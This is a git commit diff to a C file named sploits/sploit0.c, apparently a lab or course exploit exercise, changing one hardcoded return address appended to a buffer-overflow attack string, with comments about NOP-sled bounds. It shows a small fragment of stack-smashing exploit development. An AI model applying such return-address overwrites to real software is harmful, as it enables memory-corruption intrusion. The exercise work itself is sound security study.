58da90e0f6ca7c23d23f32e4970ab0e505c1c037
pandaxuCESO <49774769+30PandaX@users.noreply.github.com>
2021-12-08 00:49:39 -0500

    Update sploit0.c

--- sploits/sploit0.c
+++ sploits/sploit0.c
@@ -53,7 +53,7 @@ int main(void)
 
     // 0x90 outside higher bound
     // strcat(str, "\x00\xfc\xff\xbf");
-    strcat(str, "\xf6\xfc\xff\xbf");
+    strcat(str, "\xf8\xfc\xff\xbf");
     // 0x90 outside lower bound
     // strcat(str, "\x10\xfb\xff\xbf");
     // strcat(str, "\x2a\xfb\xff\xbf");
